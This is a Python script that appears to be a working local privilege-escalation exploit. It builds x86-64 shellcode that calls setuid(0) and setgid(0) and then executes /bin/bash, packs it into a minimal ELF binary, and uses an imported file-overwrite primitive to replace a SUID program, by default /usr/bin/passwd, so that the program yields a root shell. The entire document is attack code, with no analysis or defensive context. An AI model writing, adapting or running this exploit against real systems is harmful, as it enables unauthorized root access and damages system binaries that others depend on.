#!/usr/bin/env python3
import struct
import os
import sys

from copyfail_primitive import copy_fail_path


def payload():
    code = bytearray()
    fix = []

    def emit(x):
        code.extend(x)

    def lea(modrm, label):
        pos = len(code)
        emit(b"\x48\x8d" + bytes([modrm]) + b"\0\0\0\0")
        fix.append((pos + 3, label, pos + 7))

    emit(b"\x31\xff\x6a\x69\x58\x0f\x05")
    emit(b"\x31\xff\x6a\x6a\x58\x0f\x05")
    lea(0x3D, "bash")
    emit(b"\x31\xd2\x52\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05")
    emit(b"\x31\xff\x6a\x3c\x58\x0f\x05")
    labels = {"bash": len(code)}
    emit(b"/bin/bash\0")
    for at, label, rip in fix:
        code[at : at + 4] = struct.pack("<i", labels[label] - rip)

    off = 0x78
    size = off + len(code)
    eh = bytearray(0x40)
    eh[:16] = b"\x7fELF\x02\x01\x01" + b"\0" * 9
    struct.pack_into("<HHIQQQIHHHHHH", eh, 16, 2, 0x3E, 1, 0x400000 + off, 0x40, 0, 0, 0x40, 0x38, 1, 0, 0, 0)
    ph = bytearray(0x38)
    struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
    return bytes(eh + ph + code)

target = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("DCF_SUIDBIN", "/usr/bin/passwd")
data = payload()
copy_fail_path(target, data)
print(f"patched {target} with bash payload {len(data)} bytes")
